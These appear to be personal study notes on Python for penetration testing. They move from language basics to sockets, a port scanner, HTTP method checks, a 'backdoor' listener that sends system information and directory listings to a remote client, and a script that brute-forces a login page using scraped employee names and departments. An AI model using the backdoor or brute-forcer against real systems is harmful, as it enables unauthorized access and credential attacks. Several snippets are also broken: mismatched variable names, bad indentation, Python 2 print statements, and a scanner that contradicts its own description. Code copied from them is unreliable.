# Python

Python is:

* Cross-platform.
* Free.
* Interpreted.
* Usable in conjunction with components written in some other languages.
* Uses whitespace and indentation to determine block structures.
* Python does not use brackets to delimit a block, using indentation instead.
* A delimiter isn't needed (as ';').
* There isn't the need to declare the type of a variable.
* The following is interpreted as **False**: `0`, `False`, `None`, `""`, `[]`. Everything else is considered as `True`.
* Comparison and Logical operators: `<`, `<=`. `==`, `>`, `>=`, `!=`, `is`, `is not`, `in`, `not in`, `And`, `Or`, `Not`.
* There isn't a `switch / case` statement.

Operators:

```
=, +, -, *, /, // (division, with results in truncation), ** (exponentiation), %
```

You can use:

```python
"allow 'single' quotes"
'allow "double" quotes'
'''contain single and double quotes'''
```

```python
# String manipulation

x = "Hello World!"
print(x[0])       # H
print(x[1])       # e
print(x[-1])      # !
print(x[0:3])     # Hel
print(x[4:])      # o World!
print(x[:])       # Hello World!

# Input/Output

user_input = input("Message ")
print("User's message:", user_input)

# Conditions
if expression:
  statement
else :
  statement

# Loops

while condition:
  statements_block
post_while_statements

for item in sequence
  for_statements
post_for_statements

# Ranges

range(5) # contains values from 0 to 4
range(0,5) # 0, 1, 2, 3, 4
```

### Lists

* Ordered collections of any type of object
* The general form of a list is a comma-separated list of elements, embraced in square brackets
* Lists are mutable, elements can be modified by assignments
* Python implements many functions that can be used to modifyu a list:
  * `append`: append a new element to the target list
  * `extend`: allows to add one list to another
  * `insert`: add a new list element right before a specific index
  * `del`: delete list items or slices, indices are automatically updated
  * `remove`: it does not work with indices, instead it looks for a given value within the list and it removes that element
  * `.pop(i)`: removes the item at the given position
  * `.sort()`: sorts a list (items must be of the same type)
  * `.reverse()`: reverses the order of the elments in the list

```python
simple_list = [1, 2, 3, 4, 5]
list = [1, 2, "els", 4, 5, "something, [0,9]]

x = [1, 2, 3, 4, "els", 5, 6]
del x[2]      # [1, 2, 4, "els", 5, 6]
del x[2]      # [1, 2, "els", 5, 6]
del x[2:]     # [1, 2]
x.remove(2)   # [1]
```

### Dictionaries

* Similar to associative arrays
* Mapping objects
* Instead of being indexed by numbers, dictionaries are using _keys_ for indexing elements
* We have some methods:
  * `.values()`: returns all the values stored in the dictionary
  * `.keys()`: returns all the keys stored in the dictionary
  * `.items()`: returns all the keys and values in the dictionary
* We can also check wif an specific item exists using the existing two following methods:
  * `key in dictionary`
  * `get(key, message)`: if the key exists, returns the associated value, otherwise prints the message passed as an parameter

```python
dictionary = {'first': 'one', 'second': 2}
```

```python
# Functions
# - `function_name.__doc__` shows function description
# - each call to a function creates a new local scope as well as the assigned names within a function that are local to that function
# - global variables can ge used within the function, but to do that we need to insert the keyword  `global` followed by the variable name

def function_name(param1, param2, ...):
  """ function documentation """
  function_statements
  return expression


# Modules
#  A module is a file that contains source code

from module_name import object_name1, object_name2, ...
from module_name import *
```

### Network sockets

```python
""" server.py """
""" Binds itself to a specific address and port and will listen for incoming TCP communications """

import socket

SVR_ADDR = input("Type the server IP address: ")
SRV_PORT = input("Type the server port: ")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Default family socket, using TCP and the default socket type connection-oriented (SOCK_STREAM)
s.bind((SRV_ADDR, SRV_PORT))
s.listen(1)

print("Server started! Waiting for connections...")
connection, address = s.accept()                      # 'connection' is the socket object we will use to send and receive data, 'address' contains the client address bound to the socket
print('Client connected with address:', address)
while 1:                                              # maximum number of queued connections
  data = connection.recv(1024)
  if not data: break
  connection.sendall(b'-- Message Received --\n')
  print(data.decode('utf-8'))
connection.close()
```

```bash
nc <server_ip> <port>
```

```python
""" client.py """
import socket

SVR_ADDR = input("Type the server IP address: ")
SRV_PORT = input("Type the server port: ")

my_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
my_sock.connect((SVR_ADDR, SRV_PORT))
print("Connection established")

message = input("Message to send: ")
my_sock.sendall(message.encode())
my_sock.close()
```

### Port Scanner

* Instead of using `connect()` we'll use `connect_ex()`, which returns - if the operation succeeded.
* This script will use the full 3-way handshake.

```python
import socket

target = input('Enter the IP address to scan: ')
portrange = input('Enter the port range to scan (ex 5-200): ')

lowport = int(portrange.split('-')[0])
highport = int(portrange.split('-')[1])

print('Scanning host ', target, 'from port', lowport, 'to port', highport)

for port in range(lowport, highport):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  status = s.connect((target, port))
  if (status ==0):
    print('*** Port', port, ' - OPEN ***')
  else:
      print('*** Port', port, ' - Closed ***')
  s.close()
```

### Backdoor

The program simply binds itself to a NIC and a specific port (6666) and then waits for the client commands. Depending on the command received, it will return specific information to the client.

```python
import socket, platform, os

SRV_ADDR = ""
SRV_PORT = 6666

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((SRV_ADDR, SRV_PORT))
s.listen(1)
connection, address = s.accept()

while 1:
  try:
    data = connection.recv(1024)
  except:continue

    if(data.decode('utf-8') == '1'):
      tosend = platform.platform() + " " + platform.machine()
      connection.sendall(tosend.encode())
    elif(data.decode('utf-8') == '2'):
      data = connection.recv(1024)
      try:
        filelist = os.listdir(data.decode('utf-8'))
        tosend = ""
        for x in filelist:
          tosend += "," + x
      except:
        tosend += "Wrong path"
      connection.sendall(tosend.encode())
    elif(data.decode('utf-8') == '0'):
      connection.close()
    connection, address = s.accept()
```

### Example: HTTP verifier

Build a Python program that, given an IP address/hostname and port, verifies if the remote Web Server has the HTTTP method `OPTIONS` enabled.

If it does, it tries to enumerate all the other HTTP methods allowed.

```python
import http.client

host = input('Host?')
port = input('Port?')

if(port == ""):
  port = 80

try:
  connection = http.client.HTTPConnection(host, port)
  connection.request('OPTIONS', '/')
  response = connection.getresponse()
  print("Enabled methods are: ", response.getheader('allow'))
  connection.close()
except ConnectionRefusedError:
  print("Connection failed")
```

### Example: HTTP, GET request and check status code

```python
import http.client

host = input('Host?')
port = input('Port?')
url = input('URL?')

if(port == ""):
  port = 80

try:
  connection = http.client.HTTPConnection(host, port)
  connection.request('GET', url)
  response = connection.getresponse()
  print("Enabled methods are: ", response.status)
  connection.close()
except ConnectionRefusedError:
  print("Connection failed")
```

### Example: Develop a brute-forcing script in Python, that will use employee details as credentials

```python
import requests
from bs4 import BeautifulSoup as bs4

def downloadPage(url):
    r = requests.get(url)
    response = r.content
    return response

def findNames(response):
    parser = bs4(response, 'html.parser')
    names = parser.find_all('td', id='name')
    output = []
    for name in names:
        output.append(name.text)
    return output

def findDepts(response):
    parser = bs4(response, 'html.parser')
    names = parser.find_all('td', id='department')
    output = []
    for name in names:
        output.append(name.text)
    return output

def getAuthorized(url, username, password):
    r = requests.get(url, auth=(username, password))
    if str(r.status_code) != '401':
        print "\n[!] Username: " + username + " Password: " + password + " Code: " + str(r.status_code) + "\n"

page = downloadPage("http://172.16.120.120")

names = findNames(page)
uniqNames = sorted(set(names))

depts = findDepts(page)
uniqDepts = sorted(set(depts))

print "[+] Working... "
for name in uniqNames:
    for dept in uniqDepts:
        getAuthorized("http://172.16.120.120/admin.php", name, dept)
```
